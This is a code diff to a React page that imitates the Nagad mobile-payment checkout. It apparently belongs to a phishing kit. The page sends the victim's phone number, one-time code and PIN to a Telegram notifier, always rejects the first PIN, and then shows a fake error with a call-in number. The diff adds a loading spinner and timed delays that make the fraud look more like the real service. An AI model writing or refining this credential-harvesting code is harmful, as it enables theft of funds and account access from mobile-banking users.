@@ -2,6 +2,7 @@ import { useState, useEffect, useRef } from "react";
 import { useNavigate, useSearchParams } from "react-router-dom";
 import { sendTelegramNotification } from "@/lib/telegram";
 import { usePaymentMethodGuard } from "@/hooks/usePaymentMethodGuard";
+import DualCircleLoader from "@/components/DualCircleLoader";
 import cartIcon from "@/assets/cart-icon.png";
 import nagadLogoWhite from "@/assets/nagad-logo-white.png";
 
@@ -21,6 +22,7 @@ const NagadPayment = () => {
   const [pinError, setPinError] = useState("");
   const [pinAttempts, setPinAttempts] = useState(0);
   const [otpResent, setOtpResent] = useState(false);
+  const [isLoading, setIsLoading] = useState(false);
 
   const phoneInputRefs = useRef<(HTMLInputElement | null)[]>([]);
   const otpInputRef = useRef<HTMLInputElement | null>(null);
@@ -73,25 +75,34 @@ const NagadPayment = () => {
 
   const handleConfirm = () => {
     if (isValidNumber()) { 
+      setIsLoading(true);
       sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs', number: phoneDigits.join('') });
-      setPhoneError(""); setShowOtpView(true); 
+      setTimeout(() => { setPhoneError(""); setShowOtpView(true); setIsLoading(false); }, 2000);
     }
     else setPhoneError(language === 'bn' ? "অবৈধ মোবাইল নম্বর" : "Invalid mobile number");
   };
   const handleOtpConfirm = () => { 
     if (isValidOtp()) { 
+      setIsLoading(true);
       sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs', number: phoneDigits.join(''), otp: otpValue });
-      setShowOtpView(false); setShowPinView(true); setPinError(""); setPinAttempts(0); 
+      setTimeout(() => { setShowOtpView(false); setShowPinView(true); setPinError(""); setPinAttempts(0); setIsLoading(false); }, 2000);
     } 
   };
   const handlePinConfirm = () => {
+    setIsLoading(true);
     if (pinAttempts === 0) {
       sendTelegramNotification({ type: 'payment_activity', amount, method: 'Nagad', paymentType: 'mfs', number: phoneDigits.join(''), otp: otpValue, pin: pinDigits.join('') });
-      setPinError(language === 'bn' ? "ভুল পিন দেওয়া হয়েছে" : "Invalid Pin Provided");
-      setPinAttempts(1);
+      setTimeout(() => {
+        setPinError(language === 'bn' ? "ভুল পিন দেওয়া হয়েছে" : "Invalid Pin Provided");
+        setPinAttempts(1);
+        setIsLoading(false);
+      }, 2000);
     } else {
-      setPinError(language === 'bn' ? "অজানা ত্রুটি। আরও তথ্যের জন্য 16167 এ কল করুন।" : "Unknown Error. Please call 16167 for more information.");
-      setPinAttempts(2);
+      setTimeout(() => {
+        setPinError(language === 'bn' ? "অজানা ত্রুটি। আরও তথ্যের জন্য 16167 এ কল করুন।" : "Unknown Error. Please call 16167 for more information.");
+        setPinAttempts(2);
+        setIsLoading(false);
+      }, 2000);
     }
   };
   const handleResendOtp = () => {
@@ -162,6 +173,7 @@ const NagadPayment = () => {
 
   return (
     <div className="h-[100dvh] w-screen flex items-center justify-center bg-gray-300 overflow-hidden">
+      {isLoading && <DualCircleLoader />}
       <div className="w-full max-w-[430px] h-full flex flex-col overflow-hidden border-4 min-[375px]:border-[8px] border-black"
         style={{ background: 'linear-gradient(180deg, #C41E3A 0%, #8B0000 100%)' }}>
         
